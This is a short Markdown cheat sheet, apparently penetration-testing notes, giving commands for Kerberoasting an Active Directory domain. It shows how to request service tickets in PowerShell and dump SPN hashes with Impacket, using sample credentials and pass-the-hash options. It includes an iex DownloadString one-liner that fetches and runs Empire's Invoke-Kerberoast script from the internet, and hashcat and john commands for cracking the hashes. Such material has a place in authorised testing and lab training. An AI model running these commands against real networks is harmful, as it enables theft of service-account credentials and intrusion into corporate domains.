### KRB_REQ_TGS
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

```powershell
klist
```

### Kerberostable/Kerberosting
**Linux*
```bash

sudo /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip  192.168.237.57 'OFFSEC.LOCAL/Nathan:abc123//'


sudo /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

**Windows**

```powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoastables.txt
```

**Crack**

```bash
hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoastables.txt
```